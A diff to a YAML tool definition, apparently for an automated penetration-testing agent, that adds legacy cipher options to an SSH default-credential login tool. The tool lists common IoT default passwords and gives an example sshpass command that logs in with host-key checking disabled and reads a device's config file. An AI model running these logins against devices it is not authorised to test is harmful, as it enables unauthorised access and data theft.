@@ -8,13 +8,13 @@ description: >
   Attempt SSH login with credentials. Executes a command on the remote host
   and returns the output as proof. Use to PROVE default credential vulnerabilities.
   IMPORTANT: Always include legacy algorithm options to handle IoT devices with weak crypto:
-  sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa USER@HOST 'COMMAND'
+  sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc USER@HOST 'COMMAND'
   Common IoT default creds: admin:admin, root:root, ubnt:ubnt, pi:raspberry.
-  Example: sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa admin@192.168.100.13 'id && cat /etc/iot/config.json'
+  Example: sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@192.168.100.13 'id && cat /etc/iot/config.json'
 max_output: 3000
 parameters:
   - name: "command_string"
     type: "string"
-    description: "Full sshpass command (e.g. \"sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa admin@192.168.100.13 'id && cat /etc/iot/config.json'\")"
+    description: "Full sshpass command (e.g. \"sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@192.168.100.13 'id && cat /etc/iot/config.json'\")"
     required: true
     format: "positional"
